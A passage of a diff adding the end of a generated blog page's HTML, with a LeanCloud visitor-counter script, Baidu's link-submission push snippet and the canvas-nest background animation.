+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
